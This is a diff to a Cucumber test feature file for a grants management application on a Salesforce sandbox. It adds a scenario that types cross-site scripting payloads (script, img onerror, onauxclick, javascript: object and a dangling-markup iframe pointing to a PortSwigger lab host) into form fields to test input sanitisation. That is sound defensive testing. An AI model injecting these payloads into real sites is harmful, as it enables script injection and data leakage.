@@ -1535,15 +1535,60 @@ Feature: Validate all scenarios of every modules flow
   @tst
   Scenario: end-to-end-flow-paymentrequest-progressreport-closeout
     Given I login to "As a Grantor" app as "PM" user
-    And I navigate to url "https://test8-internal--prolwcut.sandbox.lightning.force.com/lightning/r/AmendmentRequest__c/a1YDV000002wrVT2AY/view"
+    And I navigate to url "https://test8-internal--prolwcut.sandbox.lightning.force.com/lightning/r/Program__c/a37DV000000fKCKYA2/view"
     And I wait for "10" seconds
-    When I select radio button "Forward" in the approval decision
-    And I submit the approval in the approval decision
-#    Then I can see the message "Comments are Required." in the approval decision
-    And I refresh the page
-    And I wait for "3" seconds
-    When I select radio button "Forward" in the approval decision
-    And I select user "{SavedValue:EXE1 Username}" in the approval decision
-    When I enter comment "Automation testing" in the approval decision
-    And I submit the approval in the approval decision without processing
+    And I navigate to "Messages" sub tab
+    And I click on top right button "Send Email" in flex table with id "CommunicationHistory"
+    And I send the email under collab tab with following details:
+      | To                        | Cc                         | Subject | Body            |
+      | pm.automation@yopmail.com | exe.automation@yopmail.com | test    | Automation Test |
     And I halt execution
+
+  @TestingXSS
+  Scenario: Testing xss
+    When I login to "As a Grantor" app as "dynamicUser" user
+    And I navigate to "Planning" tab
+    When I navigate to "Internal Programs" content inside "Programs" subheader on left panel
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on top right button "New" in flex table with id "---program:-:programsTableId---"
+    When I enter "xss_creation" values from "Program_Field_Values.xlsx"
+    And I click modal button "Save and Continue"
+    When I enter "xss_edition" values from "Program_Field_Values.xlsx"
+    And I click on "Save" in the page details
+    And I get the "EGMS ID"
+    Then I softly see field "Status" as "Created"
+    When I navigate to "Responsibilities" sub tab
+    When I enter the following values into flex table with id "---program:-:peerReviewTableId---" by clicking "New" :
+      | Reviewer Name | Responsibility   | Description                                                        | Due Date |
+      | Automation PM | Program Reviewer | <script><img title="</script><img src onerror=alert(1)>"></script> | 10       |
+    When I get the "EGMS ID"
+    When I navigate to "Setup" sub tab
+    When I enter the following values into flex table with id "---program:-:checklistTableId---" by clicking "Add" :
+      | Description                                                                         | Required | Applies To  | Status |
+      | <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | Optional | Application | Active |
+    Then I softly see the following messages in the page details contains:
+      | Saved Successfully! |
+    When I click on "Upload Template" icon for "Not Applicable" inside flex table with id "---program:-:checklistTableId---" without waiting for record
+    And I upload attachment without random number "Attachment.pdf" of type "Others" with description "<input onauxclick=alert(1)>" from computer
+    Then I softly see the following messages in the page details contains:
+      | File Attachment.pdf Uploaded successfully. |
+    When I click modal button "Close"
+    And I navigate to "Files" sub tab
+    And I click on top right button "Add Files" in flex table with id "---program:-:GrantorInternalProgramFilesTableId---"
+    And I pause execution for "5" seconds
+    And I upload attachment without random number "Attachment.pdf" of type "Program Artifacts" with description "<input onauxclick=alert(1)>" from computer
+    Then I softly see the following messages in the page details contains:
+      | File Attachment.pdf Uploaded successfully. |
+    When I click modal button "Close"
+    When I enter the following values into flex table with id "---program:-:internalProgramNotesTableId---" by clicking "New" :
+      | Title                                                                    | Description                         |
+      | <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea> | <object data="javascript:alert(1)"> |
+    Then I softly see the following messages in the page details contains:
+      | Saved Successfully! |
+    And I click on top right button "Send Email" in flex table with id "CommunicationHistory"
+    And I send the email under collab tab with following details:
+      | To                        | Cc                         | Subject | Body            |
+      | pm.automation@yopmail.com | exe.automation@yopmail.com | test    | Automation Test |
+    Then I see the text "Email Sent Successfully." in modal
+    And I halt execution
+
